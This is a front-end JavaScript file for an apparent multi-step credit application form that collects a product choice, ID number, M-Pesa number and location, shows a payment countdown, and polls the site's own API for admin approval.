document.addEventListener('DOMContentLoaded', () => {
    const formData = { product: { model: '', category: '', price: 0 }, idNumber: '', mpesaNumber: '', mpesaNumberConfirm: '', location: '', amount: 0 };
    let currentAppId = null;
    let pollInterval = null;

    function goToStage(stageNumber) {
        document.querySelectorAll('.form-stage').forEach(stage => stage.classList.remove('active'));
        document.getElementById(`stage-${stageNumber}`).classList.add('active');

        for (let i = 1; i <= 4; i++) {
            const indicator = document.getElementById(`step-indicator-${i}`);
            if (indicator) {
                if (i < stageNumber) { indicator.classList.add('completed'); indicator.classList.remove('active'); } 
                else if (i === stageNumber) { indicator.classList.add('active'); indicator.classList.remove('completed'); } 
                else { indicator.classList.remove('active', 'completed'); }
            }
        }
    }

    // Auto-advance on model select
    document.querySelectorAll('input[name="product"]').forEach(radio => {
        radio.addEventListener('change', (e) => {
            formData.product.model = e.target.value;
            formData.product.category = e.target.dataset.category;
            formData.amount = e.target.dataset.price;
            
            document.getElementById('pochi-display-amount').textContent = `KES ${formData.amount}`;
            document.getElementById('selected-model-title').textContent = formData.product.model;
            document.getElementById('success-model-name').textContent = formData.product.model;
            setTimeout(() => goToStage(2), 300);
        });
    });

    // Validate details & auto-advance
    const phoneError = document.getElementById('phone-match-error');
    function checkStage2Validity() {
        const id = document.getElementById('idNumber').value.trim();
        const p1 = document.getElementById('mpesaNumber').value.trim();
        const p2 = document.getElementById('mpesaNumberConfirm').value.trim();
        const loc = document.getElementById('location').value.trim();

        if (p1.length >= 10 && p2.length >= 10) {
            phoneError.style.display = (p1 !== p2) ? 'block' : 'none';
        }

        if (id.length >= 6 && /^(07|01)[0-9]{8}$/.test(p1) && p1 === p2 && loc.length >= 2) {
            formData.idNumber = id; formData.mpesaNumber = p1; formData.mpesaNumberConfirm = p2; formData.location = loc;
            setTimeout(() => goToStage(3), 400);
        }
    }
    ['idNumber', 'mpesaNumber', 'mpesaNumberConfirm', 'location'].forEach(id => {
        document.getElementById(id).addEventListener('input', checkStage2Validity);
    });

    // Handle Payment Button & 10-Second Delay Logic
    document.getElementById('i-have-paid-btn').addEventListener('click', () => {
        goToStage(4);
        
        let secondsLeft = 10;
        const timerDisplay = document.getElementById('countdown-timer');
        timerDisplay.textContent = secondsLeft;

        // 10 Second Countdown
        const countdownInterval = setInterval(async () => {
            secondsLeft--;
            timerDisplay.textContent = secondsLeft;

            if (secondsLeft <= 0) {
                clearInterval(countdownInterval);
                document.getElementById('countdown-card').style.display = 'none';
                document.getElementById('verification-card').style.display = 'block';
                
                // Now trigger API alert to Admin Telegram Bot
                try {
                    const response = await fetch('/api/process-credit-app', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(formData)
                    });
                    const data = await response.json();
                    if (data.success) {
                        currentAppId = data.appId;
                        startPollingForAdminApproval();
                    } else {
                        alert(data.message || 'Error processing request');
                        goToStage(3);
                    }
                } catch (err) {
                    console.error('Submission error:', err);
                    goToStage(3);
                }
            }
        }, 1000);
    });

    function startPollingForAdminApproval() {
        if (pollInterval) clearInterval(pollInterval);
        pollInterval = setInterval(async () => {
            if (!currentAppId) return;
            try {
                const res = await fetch(`/api/check-status/${currentAppId}`);
                const data = await res.json();

                if (data.status === 'APPROVED') {
                    clearInterval(pollInterval);
                    goToStage(5);
                } else if (data.status === 'REJECTED') {
                    clearInterval(pollInterval);
                    alert('❌ Payment was not detected or was rejected. Please try again.');
                    document.getElementById('countdown-card').style.display = 'block';
                    document.getElementById('verification-card').style.display = 'none';
                    goToStage(3);
                }
            } catch (err) { console.error('Polling error', err); }
        }, 2000);
    }
});
